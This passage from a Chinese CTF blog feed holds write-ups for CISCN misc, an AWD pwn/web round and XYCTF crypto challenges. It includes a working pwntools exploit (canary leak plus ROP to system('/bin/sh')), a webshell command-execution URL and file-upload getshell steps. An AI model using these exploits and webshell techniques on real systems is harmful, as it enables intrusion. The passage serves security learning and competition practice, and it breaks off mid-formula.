id="parT9-deH"><a href="#parT9-deH" class="headerlink" title="parT9:deH"></a>parT9:deH</h3><p>图片底部</p><img src="/2024/05/18/ciscn2024/image-20240518205311887.png" class title="image-20240518205311887"><p>base64解密</p><img src="/2024/05/18/ciscn2024/image-20240518205400848.png" class title="image-20240518205400848"><h3 id="PARt10-9"><a href="#PARt10-9" class="headerlink" title="PARt10:9}"></a>PARt10:9}</h3><p>维吉尼亚和base64解码</p><img src="/2024/05/18/ciscn2024/image-20240518211941669.png" class title="image-20240518211941669"><p>拼接得到</p><p>flag{e675efb3-346f-405f-90dd-222b387edeH9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信创AWD wp</title>
    <link href="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/"/>
    <url>/2024/05/13/%E4%BF%A1%E5%88%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>canary保护和NX保护</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513204847024.png" class title="image-20240513204847024"><p>ida查看，存在格式化字符串漏洞和栈溢出</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205056049.png" class title="image-20240513205056049"><p>因此思路是泄露canary保护，然后ret2libc</p><p>gdb本地调试</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205653870.png" class title="image-20240513205653870"><p>发现0x7ffff7e1b780被泄露了，因此计算出canary偏移为11，输入%11$p得到</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211044393.png" class title="image-20240513211044393"><p>![image-20240513211218375](信创wp/image-20240513211218375.png</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211350110.png" class title="image-20240513211350110"><p>存在system和binsh，直接使用</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211803077.png" class title="image-20240513211803077"><p>由于是64位程序，还需要ret、和pop rdi，ROPgadget查找</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212043740.png" class title="image-20240513212043740"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">p</span>=remote(&#x27;4.2.1.3&#x27;,9999)<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">0x0000000000400903 : pop rdi ; ret</span><br><span class="hljs-string">0x00000000004005e9 : ret</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">binsh</span>=0x400928<br><span class="hljs-attribute">system</span>=0x400630<br><span class="hljs-attribute">ret</span>=0x4005e9<br><span class="hljs-attribute">pop_rdi</span>=0x400903<br><br>p1 = <span class="hljs-string">&quot;%&#123;offset&#125;<span class="hljs-variable">$p</span>\n&quot;</span>.format(offset = 11)<br><span class="hljs-built_in">print</span>(p1)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p1)<br>leak_info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>)<br>canary = int(leak_info,16)<br>log.success(<span class="hljs-string">&quot;canary:&quot;</span> + hex(canary))<br>p2 = b<span class="hljs-string">&#x27;a&#x27;</span>*(0x20-8)+p64(canary)+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>0x50改为0x20</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212528481.png" class title="image-20240513212528481"><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>存在puts，将printf改为puts</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="finecms"><a href="#finecms" class="headerlink" title="finecms"></a>finecms</h2><h3 id="漏洞1：一句话木马"><a href="#漏洞1：一句话木马" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h3><p>D盾扫出来个一句话木马</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525223420130.png" alt="image-20240525223420130"></p><h3 id="漏洞2：CSRF"><a href="#漏洞2：CSRF" class="headerlink" title="漏洞2：CSRF"></a>漏洞2：CSRF</h3><p>网站为FineCMS v5.4.0</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525224918694.png" alt="image-20240525224918694"></p><p>搜索得到</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525225207421.png" alt="image-20240525225207421"></p><h3 id="漏洞3-弱密码"><a href="#漏洞3-弱密码" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h3><p>网站后台管理员账户（admin）存在弱密码 admin</p><h3 id="漏洞4：后台getshell"><a href="#漏洞4：后台getshell" class="headerlink" title="漏洞4：后台getshell"></a>漏洞4：后台getshell</h3><p>参考：<a href="https://www.cnblogs.com/hun-ya/p/9392211.html">FineCMS v5.4.1 后台getshell - _昏鸦 - 博客园 (cnblogs.com)</a></p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234047064.png" alt="image-20240531234047064"></p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234152179.png" alt="image-20240531234152179"></p><h3 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h3><p>网站下有phpinfo.php</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240601160047542.png" alt="image-20240601160047542"></p><h1 id="meiupic3"><a href="#meiupic3" class="headerlink" title="meiupic3"></a>meiupic3</h1><h2 id="漏洞1：一句话木马-1"><a href="#漏洞1：一句话木马-1" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h2><p> 扫出来个木马</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140122585.png" alt="image-20240829140122585"></p><p>但是中间有函数报错，无法执行到木马处，估计出题人也没验证</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140138016.png" alt="image-20240829140138016"></p><p>修改下代码，验证</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.133</span>:<span class="hljs-number">7000</span><span class="hljs-regexp">//</span>templates<span class="hljs-regexp">/default/</span>common/<span class="hljs-number">404</span>.php?a=system&amp;b=ls<br></code></pre></td></tr></table></figure><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140221739.png" alt="image-20240829140221739"></p><h2 id="漏洞2：后台相册任意上传文件"><a href="#漏洞2：后台相册任意上传文件" class="headerlink" title="漏洞2：后台相册任意上传文件"></a>漏洞2：后台相册任意上传文件</h2><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140245445.png" alt="image-20240829140245445"></p><p>抓包修改上传后的名字为2.php,</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140329365.png" alt="image-20240829140329365"></p><p>访问/data/cache/tmp/2.php</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140342042.png" alt="image-20240829140342042"></p><h2 id="漏洞3-弱密码-1"><a href="#漏洞3-弱密码-1" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h2><p>网站后台管理员账户（admin）存在弱密码 admin</p><h2 id="漏洞4：后台模板修改"><a href="#漏洞4：后台模板修改" class="headerlink" title="漏洞4：后台模板修改"></a>漏洞4：后台模板修改</h2><p>由于只有个别子目录存在写权限，当某php存在写权限，后台可修改代码getshell</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240901105149189.png" alt="image-20240901105149189"></p>]]></content>
    
    
    <categories>
      
      <category>AWD WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2024WP</title>
    <link href="/2024/04/29/XYCTF2024WP/"/>
    <url>/2024/04/29/XYCTF2024WP/</url>
    
    <content type="html"><![CDATA[<p>题目顺序按照解题顺序排列，只打了前面两周，后面没看了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Sign1n-amp-Sign1n-reverg"><a href="#Sign1n-amp-Sign1n-reverg" class="headerlink" title="Sign1n & Sign1n_reverg"></a>Sign1n &amp; Sign1n_reverg</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from tqdm import *<br>import gmpy2<br>flag=b'XYCTF{uuid}'<br>flag=bytes_to_long(flag)<br>leak=bin(int(flag))<br>while 1:<br>    leak += "0"<br>    if len(leak) == 514:<br>        break<br>#swap_bits函数将input_str的二进制位前后颠倒<br>def swap_bits(input_str):<br>    input_list = list(input_str[2:])<br>    length = len(input_list)<br><br>    for i in range(length // 2):<br>        temp = input_list[i]<br>        input_list[i] = input_list[length - 1 - i]<br>        input_list[length - 1 - i] = temp<br><br>    return ''.join(input_list)<br><br>input_str = leak<br>result = swap_bits(input_str)<br>a=result<br>#custom_add将input_str的二进制数的每一位（0或1）加上i+1后对10取余<br>def custom_add(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) + i + 1) % 10)<br><br>    result = ''.join(input_list)<br>    return result<br><br><br>input_str = a<br>result = custom_add(input_str)<br>b=result<br>print(b)<br>#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567799112455779902334667900133556899112356678902344568890233457790013355689912335667990134456799023355788001244568991123467799012455778902335578800134456899123356678001344567991223557880012455689901235667801134457889023355788001345578890233566789013445778912235567900124557889013356678001344578801233467789112355779912234577990233556780113<br></code></pre></td></tr></table></figure><p>故只需将原代码中custom_add的加操作改为减再颠倒就是flag的二进制。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b = '<span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">91134567799112</span><span class="hljs-number">45577990233466</span><span class="hljs-number">79001335568991</span><span class="hljs-number">12356678902344</span><span class="hljs-number">56889023345779</span><span class="hljs-number">00133556899123</span><span class="hljs-number">35667990134456</span><span class="hljs-number">79902335578800</span><span class="hljs-number">12445689911234</span><span class="hljs-number">67799012455778</span><span class="hljs-number">90233557880013</span><span class="hljs-number">44568991233566</span><span class="hljs-number">78001344567991</span><span class="hljs-number">22355788001245</span><span class="hljs-number">56899012356678</span><span class="hljs-number">01134457889023</span><span class="hljs-number">35578800134557</span><span class="hljs-number">88902335667890</span><span class="hljs-number">13445778912235</span><span class="hljs-number">56790012455788</span><span class="hljs-number">90133566780013</span><span class="hljs-number">44578801233467</span><span class="hljs-number">78911235577991</span><span class="hljs-number">22345779902335</span><span class="hljs-number">56780113</span>'<br><br>def custom_sub(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br><br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) - i - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>)<br><br>    result = ''.join(input_list)<br>    return result<br>print(long_to_bytes(int(custom_sub(b)[::-<span class="hljs-number">1</span>].strip('0'), <span class="hljs-number">2</span>)))<span class="hljs-meta">#Sign1n需要去掉一个一个末尾的0</span><br><span class="hljs-meta">#b'XYCTF{24611067-c60f-427c-aaab-d17e4b81e2ee}'</span><br></code></pre></td></tr></table></figure><h3 id="happy-to-solve"><a href="#happy-to-solve" class="headerlink" title="happy_to_solve"></a>happy_to_solve</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_happy_prime</span>():<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = sympy.nextprime(p ^ ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>) - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> p, q<br>m = bytes_to_long(flag)<br>p, q = get_happy_prime()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-comment"># 24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-comment"># 14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br></code></pre></td></tr></table></figure><script type="math/tex; mode=display">p+q=2^{512}+r</script><script type="math/tex; mode=display">(p+q)^2=(p-q)^2+4*p*q=(p-q)^2+4*n</script><script type="math/tex; mode=display">p-q=\sqrt{(p+q)^2-4*n}</script><p>爆破r，得到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="4.944ex" height="1.758ex" role="img" focusable="false" viewbox="0 -583 2185.4 777"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(725.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(1725.4,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g></g></svg></mjx-container> ,再尝试对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.692ex" height="2.452ex" role="img" focusable="false" viewbox="0 -833.9 3400 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(1114.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mi" transform="translate(2114.4,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="msup" transform="translate(2574.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mn" transform="translate(422,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></svg></mjx-container> 开方，进而分解</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span> = <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br><span class="hljs-attribute">r</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">x</span> = <span class="hljs-number">2</span>**<span class="hljs-number">512</span>  + r<br>    <span class="hljs-attribute">tmp</span> = x ** <span class="hljs-number">2</span> - <span class="hljs-number">4</span>*n<br>    <span class="hljs-attribute">y</span> = gmpy2.iroot(tmp,<span class="hljs-number">2</span>)<br>    <span class="hljs-attribute">if</span> y[<span class="hljs-number">1</span>]:<br>        <span class="hljs-attribute">p</span> = (x+y[<span class="hljs-number">0</span>]) // <span class="hljs-number">2</span><br>        <span class="hljs-attribute">q</span> = n // p<br>        <span class="hljs-attribute">d</span> = gmpy2.invert(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>        <span class="hljs-attribute">m</span> = pow(c,d,n)<br>        <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>        <span class="hljs-attribute">print</span>(r)             <br>        <span class="hljs-attribute">break</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">r</span> += <span class="hljs-number">1</span><br><span class="hljs-comment">#b'XYCTF{24611067-c60f-427c-aaab-d17e4b81e2ee}'</span><br></code></pre></td></tr></table></figure><h3 id="factor1"><a href="#factor1" class="headerlink" title="factor1"></a>factor1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><span class="hljs-attribute">p</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">q</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">e</span> = gmpy2.invert(d, (p**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>))<br><span class="hljs-attribute">flag</span> = <span class="hljs-string">"XYCTF{"</span> + hashlib.md5(str(p + q).encode()).hexdigest() + <span class="hljs-string">"}"</span><br><span class="hljs-attribute">print</span>(e)<br><span class="hljs-attribute">print</span>(p * q)<br><span class="hljs-comment"># 172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br><span class="hljs-comment"># 99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br><br></code></pre></td></tr></table></figure><p>e过大，想到低解密指数攻击，同时得到两个函数，</p><script type="math/tex; mode=display">e * d = 1 \enspace mod \enspace (p^{3}-1)*(q^{3}-1)</script><script type="math/tex; mode=display">n = p * q</script><p>令n=<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.345ex" height="1.91ex" role="img" focusable="false" viewbox="0 -833.2 1036.6 844.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="TeXAtom" transform="translate(633,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/></g></g></g></g></g></svg></mjx-container>  在格上构造 </p><script type="math/tex; mode=display">[D, n+1</script><script type="math/tex; mode=display">0, -e]</script><p>其中D =<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="9.894ex" height="2.021ex" role="img" focusable="false" viewbox="0 -893.3 4373.1 893.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" 